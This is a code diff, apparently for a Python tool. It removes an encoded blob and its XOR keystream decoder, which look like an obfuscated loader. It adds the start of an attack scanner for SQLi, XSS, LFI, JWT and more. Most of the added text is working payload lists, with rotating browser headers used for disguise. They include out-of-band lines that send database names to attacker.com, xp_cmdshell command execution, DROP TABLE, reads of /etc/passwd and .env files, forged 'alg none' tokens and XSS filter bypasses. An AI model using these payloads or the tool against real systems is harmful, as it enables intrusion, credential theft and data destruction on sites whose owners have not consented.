-    "__jeM1}mnt2VQ^`leyyqs7kJMrV>n*)5Pj(ltgiIzic02M>K*mI(EC<S%9HW77lGODoE=l1nrv2x_uWW2dOj3G4L?l)BI_w%CJ(3"
-    "_L7Hu=om4E^SAPwovX$fE?tC8lAb5;xqG!%08Najip$Z04m37#Y6^*SIkE-"
-    "z9Wsw6j>PO#f~ZabrD!(p8eAZ((cZGaM>b~XL~R9iq{SpqS(fP-@moQQZ&z*XQz1lx1pZ-fQuz*TWlP@ST47EX|tCppW+>VA{g3~"
-    "FWeWFrK?hDsb!BAvX~_gOlw8MTRk+$W-ZZkY=~=&1i-$tDT=)DPy&CoHF0k6X5Q&L_)RIY}LqRjr}&_%c<U3}qJCrp_W-Yb|{?0;"
-    "yU^Cf?mbROe*fKMx7L@V?w8N?ZNF(;&|Sdb)``efrZD;+Z`%WPsXt_n$Fm3%IQ7ZE@(|9rjVm+>`F-"
-    ")~k2+<RDShcwba0PG$uhS({{&&U*zl05h@DH<l2X(L*=Pyy_OB%~0uEgu9H1=WSebSHM8+5^|P0Y>RX;B@j;4AWh!3Gh4kCl;szW"
-    "AODSVaK<Iw+0K3IcUj@|tw;eO4T>}N7N8TDGir7>wfIGU5)R($UpW;JYrg5`>!P)0QeCdaKz9?LA$Hd7?}ReCD*Dj&MW&H?`xJJr"
-    "f{CHcB+;3@`a6Ec;p|Fb3;jLkQC!}EqE`LyBMzX0HSM+M;J!OBKLSg4zBD+t)ccynmC~Zlg^GJRshAY<17n`srvjrYtm4nAN?Q#}"
-    "0}`nUO`2)&Ca`$pn$4K%Y#Iy)NQ`RxsgK|gyWU2#Rmhb0Eou0CWIix0L{}uL#@nGyH|Gs1yt^WzVXtx?!jc+7RtGdM<{F`Yk>h0X"
-    "?C4G(a>KmV8g<T^o7v(42Hxs8xy5`NXK4{~L|91U2v1-"
-    "=>RF+$(ci=KH+@~!MZ%D!Ym#TMa$2}f$dWO^i}oMPfU@f6m|)HC#~Lb$8wVK?ID;^f;n8K~*n_gbd!|$6{N*lGc}R#-"
-    "C&L`1E5e+U9he|?KPT=>i5$dp%7$C4PwR)feZ6NJRXUxUjZ0l}!ii9LgqMys1eq*lJ9kbLCNRd^%m1taPfruJ{Z_>i{G|4N*Lh&e"
-    "=IhYD1a!G!1g|cv?dCcp5=DIBG>k5#(G(vD*6tV|N)v(~A4MrDFP1o#jJl90qkU+phPcRUO(5e)ZGp`U03H@G><lZJ^C^>~cuL?G"
-    "Du^<(EKE%sFzFD#jJ5}PfisHq0&jB^LRa<N(X+a(0~+O?LzsTr7p#tNLw1K(rO-"
-    "HJ;mG}1CuYWVj@FOwmE&0UoAufnev}=bMNRv(423hF+-NSp7Y;ehhLC5~L<7ek+<0M{qYFltGyCb-Vy@F5^@;Y=V8l9)BA2-"
-    "aZ<NWYHs%=Ul~Ix{Z6$11!aFn1=`Y*GNya#U!jfhE>eBy;#o6)tJKb^-"
-    "Fp8?@OQ)DiQSxX`J*AT%d9MdQuKyyH6O;xT!OX4^*x(_##O1S6)OKw?LxMr(1w@nkjRLlwf(+OzOsKn}tIBQXivvuaUn{p|tAhoO"
-    ")Kr6K@Ncr`uuw#6hoc;m-!;-#)l)%AQ~ICb5{0$FEtNRck#q`<izNu{tPTpz-_nG<ZAo9gM>YiCACBBNLPo>fSn+9gw1=?CzAUj&"
-    "7y7ROq{g&iR|YGR-O@L7IN&p7$dzhIYduF?>u!Y@Ej#Yd^NZD&-D6W`FTEKFB-g@7vbVsN7_JqYqIBY%&V&&-"
-    "DFg#sv<(7zI|wgbQN<#(c;xfW!`T2Ms4KB)_9IvIiisG`LE?3lfEYvmgwlSoqd{I1(8Ijc&`(YjEUUm0rQ6y$>9!cI0{m1g>RlK3"
-    "E|$O$Ru%L|q_rHj<{M;|F%F0mAr>84-"
-    "x?MfALyDd#hHPMEdVKy)&te5Rkae?U%1N{t4vWhy}dVteB2Mz)+Wv)ShyJ>3Jj`u1CDwV!}ut<&3pfCS^5TiV4<Q~S0e11iV;PGq"
-    "x`?uyQs!yUHs3Wm!&@Ihj0s-"
-    "%kQJ8iLW<UEXXGMhJosgEn>)AuV9(bZm83S(nIQ9F>{IH^TP1f%M9vZuOSflJA^S|_u;kKh6ZFLCN&Sa*73F^8FbD|K)|Lpml63l"
-    "3OOJoROZCP4taNR7ELR43*WJY{zqQ2*xy^ggF-"
-    "H`<MiU+EG(ehG|%jq#`Rx_W02;<xwd@R$RX{<%U8ET)jTxN8J`On)h<fJRc)9e+}3P<=HJvq3G)6wZco+56FKMq<-"
-    "OAS?dY1*O_4ZpWj5}s#K}14a3<33ymaucy!ECjUx&_`7A)HihhG<3#&U&I*?!fx;Ty@;c#}r(dpC%wcmhqQyfCY<U}gzEiLr~|--"
-    "hpcA@TvH`@Hb3o*4>CMf_WdcErOQaM$G{h$m0{Q2m6gI8dw7&gsH;cWbe&_H3um-"
-    "x(6RlW7)zP%`ZSTxd+5GM}!k5wu;5c^rMbH!d`%v47x7&za4yLQ`pCBMqiYbrGuXz9|N9KRnNZ>Qe3_YQWmR&7fPRqU}<ruUiu0I"
-    "?!pR57%K})K(-d$bUV1_TC(lIf%)*$kBbRSd~8KIxB{L#ZucBZwh0Onn5=Uo0vTKTp2WTM|K03*0WYh!o*r_AFryTo7d1|Ct-"
-    "{{T#Dk-HyzG<g1JeVFp|ZyP*KYSj5ib4d@e6yU5H@_c*Sw7c`ZQ4Is49Fg3FNS>aaKQtmgs62hO#qU3r})`D6^cx0b*b7f#N!r@d"
-    "M?C!|aNX{(j(q5iygE$IOzSw>{hgFXJKVX!I~P>$pG3eORxu`R9d!|Ivfe$nus|Dn$iUTR~Ci6y8M&qCy{C<f%tR$0Nh;D#Eiw4A"
-    "`WU?_GN(@;>C?g#z#>8!5~w_lXhWZm3+&6Y6WF~bEv?Ni}zK)+1c*7?m;nCi|abnzP{1LiY{M`0{^O0`s1gwVl)1O$w$ie8V<@0D"
-    "QIhSRa*hFk!~PWJGe3*d`~K|2Z|4?#ustwtxmhTa+nz}9GvmVn1t3<3DygdI+2^BR+<9Z&1a<BGZ95b*=;cV)euPOVrk2`=bf<wI"
-    "oxhm!0*lIj=Hy#^G2U?t=HTjtx+?1fgUjMx*s33#8?UEWG0K`{UtYYl@b??dCITGb~{M;C^f9`pdu))q%ernCNY{+!B8hcaGElmm"
-    "Qk?deWaGdv@~Ey`nbm|y>U!&Qi1rftIr;p4<*O`bLjN^|n#h`y#T84j5W{vtgC#28T|8Aqk$t|h!N_5+~?O1*R^%!l8TD9{sIEwj"
-    "|XeFZTQ3K3^pal~=&n_rR(xa+~vCJ%-iKa2g-j@)PQ(({iAJ;~kMgEt-2uIh287Uo_#Ci%Np-"
-    "~EMAyBcvbl^uvDhi*w$e!0LMI*+yJo#6opDz<)@_TG>v+8ApjUDl<&!~Hq^!p%*z<{t^-?Z($-"
-    "G>18JAR3q5Q;F_kWA$)=&1kekp#=qm0^&1Bv3fBx&cINZit12{zw`Ah^3507<*H2IEHv7FDmZoXOZ+ZLG))<tgHcVXt=I8{+@6wU"
-    "qK;JUVal7~;%^v4-"
-    "uMN4ZwT%?!x%PGx;ei|qd&BbXU}snnRCdR`0qRw^jih@(7i%KKEdx?thj{Z{~I^PY9fKGIxV=|gU#MOyX(3CgGMUSM;4^SUA}Dp^"
-    "?VHfGj^YkNEkrUBGyTK4;8=3Yob}8kgEDgk&5^(U=y0A2V?H3AfYRJDZUjLXOa<2Xa({L9yC%;qqtIMf6xbKNH68xPGkQv(v6|L#"
-    "k^uV1kr7_JaGC0Sws6f>Ds2DIR-zt*t&-(0^#!UbTo9GW3)oF|M_z+5o1<gv(xyhi(Z7H-"
-    "&#n2WjkAp#Uy8N3q!jwAifvDz1W71L`gILxt<CjhVEWFm*O6E$=r^^(2H~^XQx@uPX%aL;vcCV6H}3SM&lvNis`^VfJ{nuAk44K;"
-    "IKCvBuz>nV1&eoe%U9Z5i7xn7~RZs<Vn!L^I<i+%g-ac*7Gcs((*na^N;R|Bz^evM)%D_(84gXE=W~v&(~j4SWGKx<^"
+# Color support
+USE_COLORS = True
+if IS_WIN:
+    try:
+        import ctypes
+        kernel32 = ctypes.windll.kernel32
+        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
+    except:
+        USE_COLORS = False
+if IS_TERMUX:
+    USE_COLORS = True
+
+class C:
+    if USE_COLORS:
+        R="\033[1;31m";G="\033[1;32m";Y="\033[1;33m";B="\033[1;34m"
+        M="\033[1;35m";CY="\033[1;36m";W="\033[1;37m";X="\033[0m"
+        BO="\033[1m";U="\033[4m";D="\033[2m"
+    else:
+        R=G=Y=B=M=CY=W=X=BO=U=D=""
+
+ANSI_PAT = re.compile(r"\x1b\[[0-9;]*m")
+
+BANNER = (
+    C.R+"""╔══════════════════════════════════════════════════════════════════════════════╗
+║                                                                              ║
+║     ████  ██      █████ ██  ██  ████  ██   ████   ██ ████  █████   ████      ║
+║    ██  ██ ██     ██     ██  ██ ██  ██ ███ ██████ █████  ██ ██  ██   ██       ║
+║    ██████ ██      ████  ██████ ██████ ██ █ ████ █ ████████ █████    ██       ║
+║    ██  ██ ██         ██ ██  ██ ██  ██ ██   ████   ████  ██ ██ ██    ██       ║
+║    ██  ██ ████████████  ██  ██ ██  ██ ██   ████   ████  ██ ██  ██  ████      ║
+║                                                                              ║
+╠══════════════════════════════════════════════════════════════════════════════╣
+║          ~  AL SHAMMARI  ~    Multi-Vulnerability Scanner   [v2.0]           ║
+║       SQLi  XSS  IDOR  Auth  SSTI  NoSQL  XXE  CMDi  LFI  JWT  GraphQL       ║
+╚══════════════════════════════════════════════════════════════════════════════╝"""
+    +C.X+"\n"
 )
 
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; CrOS x86_64 15633.69.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
+    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+]
 
-def _keystream(length: int, seed: bytes) -> bytes:
-    data = bytearray()
-    counter = 0
-    while len(data) < length:
-        data.extend(
-            hashlib.blake2s(
-                seed + counter.to_bytes(4, "little"),
-                digest_size=32,
-            ).digest()
-        )
-        counter += 1
-    return bytes(data[:length])
+REFERERS = [
+    "https://www.google.com/search?q=test", "https://www.bing.com/search?q=test",
+    "https://www.yahoo.com/search?q=test", "https://duckduckgo.com/?q=test",
+    "https://www.google.com/", "https://www.facebook.com/", "https://www.twitter.com/",
+    "https://www.linkedin.com/", "https://www.reddit.com/", "https://www.youtube.com/",
+    "https://www.wikipedia.org/", "https://www.github.com/", "https://www.stackoverflow.com/",
+    "https://www.amazon.com/", "https://www.netflix.com/",
+]
 
+STD_HEADERS = {
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
+    "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1",
+    "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1",
+    "Cache-Control": "max-age=0", "DNT": "1", "TE": "trailers",
+}
 
-def _xor_bytes(data: bytes, stream: bytes) -> bytes:
-    return bytes(left ^ right for left, right in zip(data, stream))
+SQLI = {
+    "basic": [
+        "' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --", "' OR 1=1 #",
+        "admin' --", "admin' #", "' OR ''='", "1' OR '1'='1",
+        "') OR ('1'='1", "')) OR (('1'='1", "' OR '1'='1' /*",
+        "1' OR '1'='1' -- -", "admin'/*", "' OR 1=1#", "' OR 1=1/*",
+        "admin' OR 1=1--", "' OR 'a'='a", "1' OR '1'='1'--",
+        "' OR 1=1 -- -", "1' OR '1'='1' /*",
+    ],
+    "union": [
+        "' UNION SELECT NULL --", "' UNION SELECT NULL,NULL --",
+        "' UNION SELECT NULL,NULL,NULL --", "' UNION SELECT NULL,NULL,NULL,NULL --",
+        "' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
+        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL --",
+        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --",
+        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --",
+        "' UNION SELECT 1,2,3 --", "' UNION SELECT 1,2,3,4 --",
+        "' UNION SELECT username,password FROM users --",
+        "' UNION SELECT table_name,NULL FROM information_schema.tables --",
+        "' UNION SELECT column_name,NULL FROM information_schema.columns --",
+        "' UNION SELECT @@version,NULL --", "' UNION SELECT database(),user() --",
+        "' UNION SELECT load_file('/etc/passwd'),NULL --",
+        "' UNION SELECT schema_name,NULL FROM information_schema.schemata --",
+        "' UNION SELECT CONCAT(username,0x3a,password),NULL FROM users --",
+    ],
+    "blind": [
+        "' AND 1=1 --", "' AND 1=2 --", "' AND SLEEP(5) --",
+        "' AND (SELECT * FROM (SELECT(SLEEP(5)))abc) --",
+        "' AND IF(1=1,SLEEP(5),0) --", "' AND IF(1=2,SLEEP(5),0) --",
+        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
+        "' AND '1'='1' --", "' AND '1'='2' --",
+        "' AND LENGTH(database())>0 --", "' AND 1=1#", "' AND 1=2#",
+        "' AND 'a'='a' --", "' AND 'a'='b' --",
+        "' AND IF(1=1,1,0) --", "' AND IF(1=2,1,0) --",
+        "1' AND SLEEP(5)#", "' AND (SELECT COUNT(*) FROM users)>0 --",
+    ],
+    "error": [
+        "'", "''", "' AND '1'='1", "' AND '1'='2", "1'", "1\"",
+        "' AND 1=CONVERT(int,(SELECT @@version)) --",
+        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
+        "' EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --",
+        "' UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1) --",
+        "1' ORDER BY 1--", "1' ORDER BY 10--", "1' ORDER BY 100--",
+        "' AND 1=CONVERT(int,@@version) --", "' HAVING 1=1 --",
+        "' AND 1=(SELECT TOP 1 CAST(@@version AS INT)) --",
+        "' AND 1=CAST((SELECT @@version) AS INT) --",
+        "' AND 1=(SELECT CONVERT(int,db_name())) --",
+        "' AND GTID_SUBTRACT('a','b') --",
+        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e)) --",
+        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e)) --",
+        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1) --",
+        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),0x3a,version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
+        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
+        "' PROCEDURE ANALYSE() --",
+        "' AND ExtractValue(1,concat(0x7e,(SELECT table_name FROM information_schema.columns WHERE column_name='password' LIMIT 1),0x7e)) --",
+        "') AND 1=CONVERT(int,@@version) --",
+        "\" AND 1=CONVERT(int,@@version) --",
+        "' AND 1=(SELECT CAST(@@version AS INT)) --",
+        "' AND EXP(~(SELECT * FROM (SELECT CONCAT(version(),FLOOR(RAND(0)*2)))x)) --",
+        "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(@@version)) USING utf8))) --",
+        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),0x7e,FLOOR(RAND(0)*2))a FROM information_schema.tables GROUP BY a)b) --",
+        "' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0) --",
+        "1' AND row(1,1)>(SELECT 1,2 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
+    ],
+    "time": [
+        "' AND SLEEP(5) --", "' AND SLEEP(10) --",
+        "' WAITFOR DELAY '0:0:5' --", "'; WAITFOR DELAY '0:0:5' --",
+        "' AND (SELECT * FROM (SELECT(SLEEP(5)))abc) --",
+        "' AND IF(1=1,SLEEP(5),0) --", "' AND IF(1=2,SLEEP(5),0) --",
+        "1; SELECT SLEEP(5) --", "1' AND BENCHMARK(10000000,SHA1('test')) --",
+        "' AND pg_sleep(5) --", "'; SELECT pg_sleep(5) --",
+        "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) --",
+        "' AND SLEEP(3)=0 LIMIT 1 --", "1' AND SLEEP(5)#",
+        "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
+        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
+        "' AND SLEEP(5)-- -", "\" AND SLEEP(5)--",
+        "') AND SLEEP(5)--", "')) AND SLEEP(5)--",
+        "1' AND SLEEP(5)-- -", "1) AND SLEEP(5)--",
+        "1)) AND SLEEP(5)--", "1 AND SLEEP(5)",
+        "' OR SLEEP(5)--", "\" OR SLEEP(5)--",
+        "'X' WHERE 1=1; WAITFOR DELAY '0:0:5'--",
+        "'; IF(1=1) WAITFOR DELAY '0:0:5'--",
+        "1%' AND SLEEP(5) --",
+        "' AND IF(SUBSTR(@@version,1,1)>0,SLEEP(5),0) --",
+        "' AND IF(ASCII(SUBSTRING(USER(),1,1))>0,SLEEP(5),0) --",
+        "' AND IF(LENGTH(database())>0,SLEEP(5),0) --",
+        "1)) AND (SELECT * FROM (SELECT(SLEEP(5)))x) --",
+        "' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) --",
+        "' AND (SELECT * FROM (SELECT(SLEEP(5)))ZWC) --",
+        "' /*!50000AND*/ SLEEP(5) --",
+        "' AND BENCHMARK(5000000,MD5('test')) --",
+        "' AND BENCHMARK(2000000,SHA2('test',256)) --",
+        "' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B) --",
+        "1' OR SLEEP(5) --", "'||SLEEP(5)#",
+        "1); WAITFOR DELAY '0:0:5' --",
+        "' AND pg_sleep(5)||pg_sleep(5) --",
+    ],
+    "graphql": [
+        "{\"query\":\"{__schema{types{name}}}\"}",
+        "{\"query\":\"{__type(name:\\\"User\\\"){fields{name}}}\"}",
+        "{\"query\":\"{user(id:1){id,email,password}}\"}",
+        "{\"query\":\"{users{id,email,password}}\"}",
+        "{\"query\":\"mutation{login(user:\\\"admin\\\",pass:\\\"' OR '1'='1\\\")}\"}",
+        "{\"query\":\"{user(id:\\\"1' OR '1'='1 --\\\"){id}}\"}",
+        "{\"query\":\"{user(filter:{id:{_eq:\\\"1' UNION SELECT 1,2,3--\\\"}}){id}}\"}",
+        "{\"query\":\"{__schema{queryType{name}}mutationType{name}}}\"}",
+        "{\"query\":\"{admin{users{id,username,password}}\"}",
+        "{\"query\":\"{search(q:\\\"' OR 1=1--\\\"){id}}\"}",
+    ],
+    "jwt": [
+        "{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"sub\":\"admin\",\"role\":\"admin\"}.",
+        "{\"alg\":\"HS256\",\"typ\":\"JWT\"}.{\"sub\":\"admin\",\"role\":\"superadmin\"}.",
+        "{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"sub\":\"1\",\"role\":\"admin\",\"exp\":9999999999}.",
+        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
+        "{\"alg\":\"HS256\",\"kid\":\"' UNION SELECT 1--\"}.{\"sub\":\"admin\"}.",
+        "{\"alg\":\"HS256\",\"kid\":\"../../../../etc/passwd\"}.{\"sub\":\"admin\"}.",
+    ],
+    "lfi": [
+        "../../../../etc/passwd", "../../etc/passwd",
+        "../../../../../../etc/passwd%00", "....//....//....//etc/passwd",
+        "/etc/passwd", "....\\....\\....\\....\\etc\\passwd",
+        "..%252f..%252f..%252fetc%252fpasswd",
+        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+        "php://filter/convert.base64-encode/resource=index.php",
+        "php://filter/read=convert.base64-encode/resource=config.php",
+        "php://input", "expect://id", "data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=",
+        "/proc/self/environ", "/proc/self/cmdline", "/var/log/apache2/access.log",
+        "file:///etc/passwd", "file:///c:/windows/win.ini",
+        "../../../../proc/self/environ", "../../../../var/www/html/.env",
+    ],
+    "mssql": [
+        "' OR 1=1 --", "'; EXEC xp_cmdshell('whoami') --",
+        "' UNION SELECT @@version,NULL --", "' HAVING 1=1 --",
+        "'; WAITFOR DELAY '0:0:5' --",
+        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --",
+        "' UNION SELECT name,NULL FROM master..sysdatabases --",
+        "'; EXEC xp_cmdshell 'net user' --",
+    ],
+    "postgresql": [
+        "' OR 1=1 --", "' UNION SELECT NULL,NULL --",
+        "' AND 1=CAST((SELECT version()) AS INT) --",
+        "'; SELECT pg_sleep(5) --", "' UNION SELECT tablename,NULL FROM pg_tables --",
+        "' UNION SELECT usename,NULL FROM pg_user --",
+        "' UNION SELECT datname,NULL FROM pg_database --",
+    ],
+    "oracle": [
+        "' OR 1=1 --", "' UNION SELECT NULL FROM DUAL --",
+        "' AND 1=CTXSYS.DRITHSX.SN(1,'x') --",
+        "' UNION SELECT table_name,NULL FROM all_tables --",
+        "' UNION SELECT username,NULL FROM all_users --",
+        "' AND (SELECT dbms_pipe.receive_message(('a'),5) FROM dual)=1 --",
+        "' UNION SELECT banner,NULL FROM v$version --",
+    ],
+    "waf": [
+        "'%20OR%20'1'%3D'1", "'%20OR%201%3D1%20--", "'%0AOR%0A1%3D1%0A--",
+        "'%09OR%091%3D1%09--", "/*!50000OR*/ 1=1 --", "' OR 1%3d1 --",
+        "1'/**/OR/**/1=1--", "'%20UNION%20SELECT%20NULL--",
+        "'%0bOR%0b1=1--", "'%0cOR%0c1=1--",
+        "'/**/OR/**/1=1/**/--", "'%20OR%20'a'%3D'a",
+    ],
+    "auth": [
+        "' OR '1'='1' --", "admin' --", "admin' #", "' OR 1=1 --",
+        "' OR ''='", "admin' OR '1'='1", "' OR 'a'='a' --",
+        "1' OR '1'='1' --", "admin' OR ''='", "1' UNION SELECT 1,1,1 --",
+        "' OR 1=1/*", "admin'/*'*/--", "admin' AND 1=1--",
+        "' OR 1=1 -- -", "admin' OR 1=1#", "' OR 'x'='x'#",
+    ],
+    "polyglot": [
+        "' OR 1=1;-- -", "') OR ('1'='1')--", "')) OR 1=1-- -",
+        "' OR 1=1 LIMIT 1--", "\") OR 1=1--", "')/**/OR/**/('1'='1",
+        "'/**/UNION/**/SELECT/**/NULL--", "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
+        "' OR TRUE--", "' OR NOT FALSE--", "' OR 1 LIKE 1--",
+        "' OR 1 REGEXP 1--", "' OR 1 RLIKE 1--", "' OR 'a' BETWEEN 'a' AND 'z'--",
+    ],
+    "stacked": [
+        "'; SELECT SLEEP(3)--", "'; SELECT pg_sleep(3)--",
+        "'; WAITFOR DELAY '0:0:3'--", "'; EXEC xp_cmdshell('whoami')--",
+        "'; SELECT @@version--", "'; SELECT version()--", "'; SELECT user()--",
+        "'; DROP TABLE temp--", "'; INSERT INTO audit_log(message) VALUES('test')--",
+        "1; SELECT SLEEP(3)--", "1;WAITFOR DELAY '0:0:3'--",
+    ],
+    "json": [
+        "\" OR \"1\"=\"1", "\" OR 1=1--", "\"} OR 1=1--",
+        "\"} UNION SELECT NULL--", "\",\"$where\":\"1==1",
+        "\" OR sleep(3)--", "\" AND IF(1=1,SLEEP(3),0)--",
+        "\\\" OR \\\"1\\\"=\\\"1", "admin\") OR (\"1\"=\"1",
+    ],
+    "second_order": [
+        "admin'--", "test' OR '1'='1", "x'); UPDATE users SET role='admin'--",
+        "x'); INSERT INTO logs(msg) VALUES(database())--",
+        "x'||(SELECT version())||'", "x'+(SELECT @@version)+'",
+        "${jndi:ldap://127.0.0.1/a}", "{{7*7}}", "<%= 7*7 %>",
+    ],
+    "oob": [
+        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.attacker.com\\\\x'))--",
+        "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--",
+        "' AND extractvalue(1,concat(0x7e,(select database()),0x7e))--",
+        "' AND updatexml(1,concat(0x7e,(select user()),0x7e),1)--",
+        "'; COPY (SELECT version()) TO PROGRAM 'nslookup attacker.com'--",
+    ],
+}
 
+XSS = {
+    "reflected": [
+        "<script>alert(1)</script>", "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
+        "<body onload=alert(1)>", "<iframe src='javascript:alert(1)'>",
+        "<img src=x onerror=alert(document.domain)>", "<svg/onload=alert(1)>",
+        "<input onfocus=alert(1) autofocus>", "<video><source onerror='alert(1)'>",
+        "<marquee onstart=alert(1)>", "<details open ontoggle=alert(1)>",
+        "<select onfocus=alert(1) autofocus>", "<textarea onfocus=alert(1) autofocus>",
+        "<a href='javascript:alert(1)'>click</a>", "<button onclick=alert(1)>click</button>",
+        "<div onmouseover='alert(1)'>hover</div>", "<img src=x:x onerror=alert(1)>",
+        "<svg><script>alert(1)</script></svg>",
+        "'\"><script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>",
+        "'\"><svg onload=alert(1)>", "javascript:alert(1)",
+        "data:text/html,<script>alert(1)</script>",
+    ],
+    "events": [
+        "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
+        "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
+        "<marquee onstart=alert(1)>", "<details open ontoggle=alert(1)>",
+        "<video onerror=alert(1)><source>", "<audio onerror=alert(1)><source>",
+        "<select onchange=alert(1)><option>1</option></select>",
+        "<form onsubmit=alert(1)><input type=submit>",
+        "<iframe onload=alert(1)>", "<object onerror=alert(1)>",
+        "<embed onload=alert(1)>", "<table background=javascript:alert(1)>",
+        "<div style=width:1px onmouseover=alert(1)>",
+    ],
+    "waf": [
+        "<ScRiPt>alert(1)</ScRiPt>", "<scr<script>ipt>alert(1)</scr</script>ipt>",
+        "<svg%20onload=alert(1)>", "<svg/onload%3Dalert(1)>",
+        "%3Cscript%3Ealert(1)%3C/script%3E", "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
+        "<img src=x onerror=\\x61lert(1)>", "<img src=x onerror=\\u0061lert(1)>",
+        "<img src=x onerror=eval('al'+'ert(1)')>", "<svg onload=alert&#40;1&#41;>",
+        "<svg onload=alert&#x28;1&#x29;>", "<svg/onload=alert(1)//",
+        "<!--><svg onload=alert(1)>", "<svg><script>alert&#40;1&#41;</script></svg>",
